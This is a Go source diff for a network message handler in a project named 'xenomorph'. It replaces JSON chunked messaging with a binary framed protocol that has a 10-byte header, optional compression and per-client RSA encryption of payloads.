@@ -2,16 +2,15 @@ package handler
 
 import (
 	"encoding/binary"
-	"encoding/json"
 	"fmt"
 	"io"
 	"net"
 
-	"github.com/codevault-llc/xenomorph/internal/common"
 	"github.com/codevault-llc/xenomorph/internal/database"
 	"github.com/codevault-llc/xenomorph/internal/shared"
 	"github.com/codevault-llc/xenomorph/pkg/encryption"
 	"github.com/codevault-llc/xenomorph/pkg/logger"
+	"github.com/codevault-llc/xenomorph/pkg/utils"
 	"go.uber.org/zap"
 )
 
@@ -31,42 +30,29 @@ func NewHandler(message shared.MessageController) *Handler {
 	}
 }
 
-const (
-	headerSize = 4
-)
-
-// ReadChunkedHeader reads a chunked header from the connection.
-func (h Handler) ReadChunkedHeader(conn net.Conn) (*common.Header, error) {
-	headerSizeBuf := make([]byte, headerSize)
-	if _, err := io.ReadFull(conn, headerSizeBuf); err != nil {
-		logger.GetLogger().Error("Failed to read header size", zap.Error(err))
-		return nil, fmt.Errorf("failed to read header size: %w", err)
+// Reads a message from the connection, extracting the message type, flags, message ID, and payload.
+// If the flags indicate that the payload is compressed, it decompresses the payload.
+func (h Handler) ReadMessage(conn net.Conn) (msgType byte, flags byte, msgID uint32, payload []byte, err error) {
+	header := make([]byte, 10)
+	if _, err = io.ReadFull(conn, header); err != nil {
+		return
 	}
 
-	logger.GetLogger().Debug("Header size read", zap.ByteString("size", headerSizeBuf))
+	totalLen := binary.BigEndian.Uint32(header[0:])
+	msgType = header[4]
+	flags = header[5]
+	msgID = binary.BigEndian.Uint32(header[6:])
 
-	headerSize := int(binary.BigEndian.Uint32(headerSizeBuf))
-
-	headerBuf := make([]byte, headerSize)
-	if _, err := io.ReadFull(conn, headerBuf); err != nil {
-		return nil, fmt.Errorf("failed to read header: %w", err)
+	payload = make([]byte, totalLen-10)
+	if _, err = io.ReadFull(conn, payload); err != nil {
+		return
 	}
 
-	var header common.Header
-	if err := json.Unmarshal(headerBuf, &header); err != nil {
-		return nil, fmt.Errorf("failed to parse header: %w", err)
+	if flags&0x1 != 0 {
+		payload, err = utils.Decompress(payload)
 	}
 
-	return &header, nil
-}
-
-// ReadChunkedMessage reads a chunked message from the connection.
-func (h Handler) ReadChunkedMessage(conn net.Conn, totalSize int) (*common.Message, error) {
-	messageBuf := make([]byte, totalSize)
-	if _, err := io.ReadFull(conn, messageBuf); err != nil {
-		return nil, fmt.Errorf("failed to read message: %w", err)
-	}
-
+	// decrypt the payload
 	client, _ := h.Server.GetClientFromAddr(conn.RemoteAddr())
 
 	var uuid string
@@ -74,40 +60,53 @@ func (h Handler) ReadChunkedMessage(conn net.Conn, totalSize int) (*common.Messa
 		uuid = client.UUID
 	}
 
-	privateKey, _ := h.Server.GetCassandra().GetClientEssentials(uuid)
-	if privateKey != "" {
-		decryptedMessage, err := encryption.RSADecryptBytes(privateKey, messageBuf)
+	_, privateKey, _ := h.Server.GetCassandra().GetClientEssentials(uuid)
+	if privateKey != "" { 
+		decryptedMessage, err := encryption.RSADecryptBytes(privateKey, payload)
 		if err != nil {
-			logger.GetLogger().Error("Failed to decrypt message", zap.Error(err), zap.String("t", string(messageBuf)))
-			return nil, fmt.Errorf("failed to decrypt message: %w", err)
+			logger.GetLogger().Error("Failed to decrypt message", zap.Error(err), zap.String("t", string(payload)))
+			return 0, 0, 0, nil, fmt.Errorf("failed to decrypt message: %w", err)
 		}
-
-		var message common.Message
-		if err := json.Unmarshal(decryptedMessage, &message); err != nil {
-			return nil, fmt.Errorf("failed to parse message: %w", err)
-		}
-
-		return &message, nil
+		
+		payload = decryptedMessage
 	}
-
-	var message common.Message
-	if err := json.Unmarshal(messageBuf, &message); err != nil {
-		return nil, fmt.Errorf("failed to parse message: %w", err)
-	}
-
-	return &message, nil
+	
+	logger.GetLogger().Debug("Read message", zap.String("type", string(msgType)), zap.Uint32("msgID", msgID), zap.Int("payloadLength", len(payload)))
+	return
 }
 
-func (h Handler) SendMessage(conn net.Conn, message *common.Message) error {
-	messageAsString, err := json.Marshal(message)
-	if err != nil {
-		return err
+// Sends a message to the connection with the specified type, flags, message ID, and payload.
+// If the flags indicate that the payload should be compressed, it compresses the payload before sending.
+// The message header consists of the total length (4 bytes), message type (1 byte),
+func (h Handler) SendMessage(conn net.Conn, msgType byte, flags byte, msgID uint32, payload []byte) error {
+	// encrypt the payload
+	client, _ := h.Server.GetClientFromAddr(conn.RemoteAddr())
+	var uuid string
+	if client != nil {
+		uuid = client.UUID
 	}
 
-	_, err = conn.Write(append(messageAsString, []byte("END_OF_MESSAGE")...))
-	if err != nil {
-		return err
+	publicKey, _, _ := h.Server.GetCassandra().GetClientEssentials(uuid)
+	if publicKey != "" {
+		encryptedMessage, err := encryption.RSAEncryptBytes(publicKey, payload)
+		if err != nil {
+			logger.GetLogger().Error("Failed to encrypt message", zap.Error(err), zap.String("t", string(payload)))
+			return fmt.Errorf("failed to encrypt message: %w", err)
+		}
+		payload = encryptedMessage
+	}
+	
+	if flags&0x1 != 0 { // compression flag
+		payload = utils.Compress(payload)
 	}
 
-	return nil
+	totalLen := 10 + len(payload) // 4+1+1+4 = 10 header bytes
+	header := make([]byte, 10)
+	binary.BigEndian.PutUint32(header[0:], uint32(totalLen))
+	header[4] = msgType
+	header[5] = flags
+	binary.BigEndian.PutUint32(header[6:], msgID)
+
+	_, err := conn.Write(append(header, payload...))
+	return err
 }
